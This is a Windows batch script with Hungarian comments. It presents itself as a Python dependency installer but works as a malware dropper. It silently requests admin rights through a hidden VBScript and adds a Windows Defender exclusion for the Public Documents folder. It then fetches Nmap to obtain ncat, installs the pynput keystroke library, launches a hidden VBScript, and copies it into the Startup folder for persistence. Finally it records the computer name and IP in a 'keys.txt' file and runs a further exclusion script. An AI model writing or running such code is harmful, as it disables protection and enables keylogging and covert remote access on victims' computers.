@echo off
setlocal enabledelayedexpansion
echo Python függőségek telepítése...
echo.

REM UAC ellenőrzés

NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    goto admin_folytatas
) ELSE (
    goto ker_admin
)

:ker_admin
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\getadmin.vbs"
    cscript //B "%temp%\getadmin.vbs"
    exit

:admin_folytatas
REM ------------------------
REM FŐ FUNKCIÓK

powershell -InputFormat None -OutputFormat None -NonInteractive -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents'"

REM ------------------------

:: get Public folder path dynamically
set "public_dir=%PUBLIC%"
set "docs_dir=%public_dir%\Documents\keys"
set "TARGET=%docs_dir%"

:: create folder tree if not exists
if not exist "%TARGET%" (
    mkdir "%TARGET%"
)


cd /d "%TARGET%"

echo [INFO] 1. Lepes: Nmap ZIP letoltese...
set "URL=https://nmap.org/dist/nmap-7.92-win32.zip"
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile 'nmap.zip' -UserAgent 'Mozilla/5.0'"

if not exist "nmap.zip" (
    echo [HIBA] A letoltes nem sikerult.
    pause
    exit /b
)

echo [INFO] 2. Lepes: Kicsomagolas...
powershell -Command "Expand-Archive -Path 'nmap.zip' -DestinationPath '%TARGET%' -Force"

for /d %%D in ("%TARGET%\nmap*") do (
    if exist "%%D\ncat.exe" set "NCAT=%%D\ncat.exe"
)

if defined NCAT (
    echo [SIKER] A program telepitese kesz.
    echo.
    echo [INFO] 3. Lepes: Program inditasa...

) else (
    echo [HIBA] Nem talaltam meg az ncat.exe-t.
    dir "%TARGET%"
    pause
)


echo Célmappa: %TARGET%
echo.

:: fájlok másolása
echo Fájlok átmásolása...
copy /Y "spwww743g7w.py" "%TARGET%\"
copy /Y "fwsendbfgw.py" "%TARGET%\"
echo Fájlok átmásolva.
echo.

:: Python letöltése és telepítése ha nincs rendszerben
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python nem található a rendszerben. Telepítés indul...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.5/python-3.12.5-amd64.exe' -OutFile '%TARGET%\python_installer.exe'"
    echo Python telepítő letöltve a %TARGET% mappába.
    "%TARGET%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    echo Varakozas hogy a rendszer felismerje...
    timeout /t 4 >nul
)
echo Python sikeresen ellenőrizve/telepítve.
echo.

:: pip frissítése
python -m pip install --upgrade pip
echo.

:: szükséges csomag telepítése
python -m pip install pynput
echo.

echo Függőségek rendben.
echo -----------------------
echo.

:: program indítás
echo Program indítása innen:
echo %TARGET%
echo.

:: ====== VBSCRIPT FUTTATÁSA LÁTHATATLANUL ======
echo [INFO] A sifustartup5sfgj.vbs inditasa...
start "" "wscript.exe" "%TARGET%\sifustartup5sfgj.vbs"
echo [SIKER] VBScript elindult (háttérben).

:: Startup mappa helye
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Lépj a Roaming mappába
cd /d "%APPDATA%\Microsoft\Windows"

:: Hozd létre a Programs mappát, ha nincs
if not exist "Programs" mkdir "Programs"

:: Hozd létre a Startup mappát a Programs alatt
if not exist "Programs\Startup" mkdir "Programs\Startup"


:: .bat fájlok bemásolása Startupba
copy "%~dp0sifustartup5sfgj.vbs" "%STARTUP_FOLDER%\sifustartup5sfgj.vbs" /Y >nul

:: run2

:: ====== MAPPÁK ======
set "TARGET=%PUBLIC%\Documents\keys"
if not exist "%TARGET%" mkdir "%TARGET%"

:: Keys.txt létrehozása, ha még nincs
if not exist "%TARGET%\keys.txt" (
    echo Created by installer > "%TARGET%\keys.txt"
)

set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Startup mappa létrehozása, ha nincs
if not exist "%STARTUP_FOLDER%" (
    mkdir "%STARTUP_FOLDER%"
)


:: ====== GÉPNÉV + IP ======
set "GEPNEV=%COMPUTERNAME%"

for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (
    set "TEMPIP=%%a"
    set "IP=!TEMPIP: =!"
)


:: ====== KEYS.TXT FELÜLÍRÁSA ======
(
    echo GEPNEV: !GEPNEV!
    echo IP: !IP!
) > "%TARGET%\keys.txt"

echo [INFO] keys.txt frissítve.
echo.

:: ====== EXCLUDE.BAZ FUTTATÁSA ======
echo.
echo [INFO] exclude.bat futtatása...

if exist "%~dp0excfb6sfb3.bat" (
    start "" "%~dp0excfb6sfb3.bat"
    echo [SIKER] exclude.bat elinditva.
) else (
    echo [HIBA] exclude.bat nem található a bat mappájában!
)

echo.

pause
